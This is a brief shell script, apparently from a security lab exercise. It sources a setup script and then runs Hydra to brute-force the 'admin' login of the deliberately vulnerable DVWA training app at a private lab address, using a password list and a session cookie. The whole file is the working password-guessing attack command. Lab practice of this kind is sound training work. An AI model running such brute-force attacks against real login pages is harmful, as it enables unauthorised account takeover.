. ./hydra_pre.sh

hydra 192.168.56.71 -l admin \
   -P ./list_password.txt \
   http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=$PHPSESSID"
